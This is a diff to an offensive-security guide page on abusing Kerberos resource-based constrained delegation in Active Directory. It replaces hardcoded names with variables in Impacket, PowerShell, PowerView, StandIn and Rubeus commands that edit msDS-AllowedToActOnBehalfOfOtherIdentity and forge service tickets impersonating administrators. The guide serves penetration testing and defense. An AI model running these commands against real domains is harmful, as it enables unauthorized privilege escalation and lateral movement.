@@ -81,7 +81,7 @@ Once the attribute has been modified, the [Impacket](https://github.com/SecureAu
 
 
 ```bash
-getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
+getST.py -spn 'cifs/target' -impersonate "Administrator" -dc-ip "$DC_IP$" "$DOMAIN"/"$ACCOUNT_WITH_SPN":"$PASSWORD"
 ```
 
 
@@ -110,14 +110,14 @@ The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powersh
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
 
 # Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
-Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $CONTROLLED_USER
 ```
 
 PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)).
 
 ```bash
 # Obtain the SID of the controlled account with SPN (e.g. Computer account)
-$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid
+$ComputerSid = Get-DomainComputer $CONTROLLED_USER -Properties objectsid | Select -Expand objectsid
 
 # Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
@@ -132,10 +132,10 @@ FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is an
 
 ```powershell
 # Obtain the SID of the controlled account with SPN (e.g. Computer account)
-StandIn.exe --object samaccountname=controlledaccountwithSPNName
+StandIn.exe --object samaccountname=$CONTROLLED_USER
 
 # Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
-StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
+StandIn.exe --computer "target" --sid $CONTROLLED_USER_SID
 ```
 
 The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert).
@@ -162,19 +162,19 @@ Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploi
 # Request a TGT for the current user
 Rubeus.exe tgtdeleg /nowrap
 # OR - Request a TGT for a specific account
-Rubeus.exe asktgt /user:"controlledaccountwithSPN" /aes256:$aesKey /nowrap
+Rubeus.exe asktgt /user:$CONTROLLED_USER /aes256:$aesKey /nowrap
 
 # Request the "impersonation" service ticket using RC4 Key
-Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
-# OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN
-Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/target" /altservice:cifs,ldap /domain:"domain" /user:"controlledaccountwithSPN" /ticket:$kirbiB64tgt
+Rubeus.exe s4u /nowrap /impersonateuser:$TARGET_USER /msdsspn:"cifs/target" /domain:"$DOMAIN" /user:$CONTROLLED_USER /rc4:$NThash
+# OR - Request the "impersonation" service ticket using TGT Ticket of the controlled account
+Rubeus.exe s4u /nowrap /impersonateuser:$TARGET_USER /msdsspn:"host/target" /altservice:cifs,ldap /domain:"$DOMAIN" /user:$CONTROLLED_USER /ticket:$kirbiB64tgt
 ```
 
 The NT hash and AES keys can be computed as follows.
 
 ```powershell
-Rubeus.exe hash /password:$password
-Rubeus.exe hash /user:$username /domain:"domain.local" /password:$password
+Rubeus.exe hash /password:$PASSWORD
+Rubeus.exe hash /user:$USER /domain:"$DOMAIN" /password:$PASSWORD
 ```
 
 > [!CAUTION]
@@ -209,7 +209,7 @@ The technique is as follows:
 
 === UNIX-like
 
-From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (Python) scripts can be used to operate that technique. At the time of writing, September 7th 2022, some of the tools used below are in Pull Requests still being reviewed before merge ([#1201](https://github.com/SecureAuthCorp/impacket/pull/1201) and [#1202](https://github.com/SecureAuthCorp/impacket/pull/1202)).
+From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (Python) scripts can be used to operate that technique.
 
 
 ```bash
